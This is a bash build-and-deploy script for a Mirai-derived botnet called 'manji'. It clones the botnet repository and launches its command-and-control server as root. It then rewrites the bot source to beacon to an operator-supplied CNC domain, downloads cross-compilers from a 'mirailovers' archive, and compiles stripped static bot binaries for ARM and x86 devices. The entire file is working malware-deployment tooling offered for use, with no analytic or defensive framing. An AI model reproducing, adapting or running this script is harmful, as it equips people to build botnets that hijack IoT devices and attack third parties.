#!/bin/bash

GRAY='\033[90m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
RESET='\033[0m'

log() {
    local level="$1"
    shift
    local message="$*"
    local timestamp=$(date '+%I:%M %p')
    
    case "$level" in
        INFO)
            echo -e "${GRAY}${timestamp} ${GREEN}INFO${RESET} ${message}"
            ;;
        WARN)
            echo -e "${GRAY}${timestamp} ${YELLOW}WARN${RESET} ${message}"
            ;;
        ERROR)
            echo -e "${GRAY}${timestamp} ${RED}ERROR${RESET} ${message}"
            ;;
        DEBUG)
            echo -e "${GRAY}${timestamp} ${BLUE}DEBUG${RESET} ${message}"
            ;;
        *)
            echo -e "${GRAY}${timestamp} ${GREEN}${level}${RESET} ${message}"
            ;;
    esac
}

CNC_DOMAIN=""
REPO_URL="https://github.com/nettproxy/manjibot.git"

while [[ $# -gt 0 ]]; do
    case $1 in
        -d|--domain)
            CNC_DOMAIN="$2"
            shift 2
            ;;
        *)
            log ERROR "Unknown option: $1"
            echo "Usage: $0 --domain <domain> or -d <domain>"
            exit 1
            ;;
    esac
done

if [ -z "$CNC_DOMAIN" ]; then
    log WARN "Domain is required. Usage: $0 --domain <domain>"
    exit 1
fi

if [ "$EUID" -ne 0 ]; then
    log ERROR "Please execute as root"
    exit 1
fi

if [ ! -f /etc/os-release ]; then
    log ERROR "Unsupported OS"
    exit 1
fi

source /etc/os-release
if [ "$ID" != "ubuntu" ]; then
    log ERROR "This script only supports Ubuntu (found $ID)"
    exit 1
fi

log INFO "Running on Ubuntu $VERSION_ID as root"

export DEBIAN_FRONTEND=noninteractive

log INFO "Installing required packages"
apt-get update -yq >/dev/null 2>&1
apt-get install -yq wget unzip gcc snapd screen bzip2 git >/dev/null 2>&1

if ! command -v go &> /dev/null; then
    log INFO "Installing Go via snap"
    snap install go --classic >/dev/null 2>&1
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORK_DIR="$SCRIPT_DIR/build_env"

rm -rf "$WORK_DIR"
mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

log INFO "Cloning repository from GitHub"
git clone "$REPO_URL" source >/dev/null 2>&1
cd source

log INFO "Building CNC"
cd cnc
go build -o cnc main.go >/dev/null 2>&1 || { log ERROR "CNC build failed"; exit 1; }

log INFO "Starting CNC in screen session 'cnc'"
pkill screen 2>/dev/null
screen -dmS cnc ./cnc
log INFO "CNC started. View with: screen -x cnc"

log INFO "Updating bot configuration"
cd "$WORK_DIR/source"
sed -i "s/resolv_lookup(\"yourdomain.com\");/resolv_lookup(\"$CNC_DOMAIN\");/g" bot/main.c

log INFO "Preparing cross-compilers"
mkdir -p /etc/xcompile
cd /etc/xcompile

download_compiler() {
    local arch="$1"
    if [ ! -d "/etc/xcompile/$arch" ]; then
        log INFO "Downloading $arch compiler"
        wget -q "https://www.mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-$arch.tar.bz2" -O "$arch.tar.bz2"
        if [ $? -eq 0 ]; then
            tar -xjf "$arch.tar.bz2" >/dev/null 2>&1
            mv "cross-compiler-$arch" "$arch"
            rm -f "$arch.tar.bz2"
        else
            log WARN "Failed to download $arch compiler"
        fi
    fi
}

download_compiler "armv7l"
download_compiler "armv5l"
download_compiler "mips"
download_compiler "mipsel"
download_compiler "i586"
download_compiler "x86_64"

cd "$WORK_DIR/source"
mkdir -p release

compile_bot() {
    local arch="$1"
    local output="$2"
    local flags="$3"
    local compiler="/etc/xcompile/$arch/bin/$arch-gcc"
    
    if [ ! -f "$compiler" ]; then
        if command -v "$arch-gcc" &> /dev/null; then
            compiler="$arch-gcc"
        else
            log ERROR "Compiler for $arch not found"
            return 1
        fi
    fi
    
    log INFO "Compiling for $output..."
    "$compiler" -std=c99 $flags bot/*.c -O3 -s -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o "release/$output" -DMIRAI_BOT_ARCH=\""$output"\" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        local strip="${compiler%-gcc}-strip"
        if [ -f "$strip" ] || command -v "$strip" &> /dev/null; then
            "$strip" "release/$output" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr 2>/dev/null
        fi
        log INFO "Successfully compiled $output"
    else
        log ERROR "Failed to compile $output"
    fi
}

compile_bot "armv7l" "manji.arm7" "-static"
compile_bot "armv5l" "manji.arm5" "-static"
compile_bot "i586" "manji.x86" "-static"
compile_bot "x86_64" "manji.dbg" "-static -DDEBUG"

log INFO "Build process complete"
log INFO "Binaries available in: $WORK_DIR/source/release/"
ls -lh "$WORK_DIR/source/release/"
